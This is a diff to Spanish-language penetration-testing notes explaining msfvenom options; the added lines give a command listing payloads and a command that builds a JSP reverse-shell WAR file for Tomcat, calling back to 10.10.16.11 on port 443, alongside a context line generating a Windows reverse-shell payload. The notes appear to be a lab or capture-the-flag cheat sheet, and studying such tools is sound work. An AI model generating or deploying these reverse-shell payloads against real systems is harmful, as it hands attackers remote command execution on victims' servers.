@@ -27,3 +27,19 @@ Ejemplo: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.10 LPORT=443 EXITF
 `-f` Formato de salida. Por ejemplo puede ser py, exe, bin, etc
 `-a`Especificamos si la maquina victima es de *x86*(32bits) o *x64*(64bits)
 `--platform` Sistema operativo de la maquina victima. Puede ser *windows* o *linux*
+
+-------
+# Comando para ver todos los payloads
+
+```shell
+msfvenom -l payloads
+```
+
+
+-------
+# [[Reverse shell]]
+
+#### Payload para tomcat archivo.war
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.11 LPORT=443 -f war -o shell.war
+```
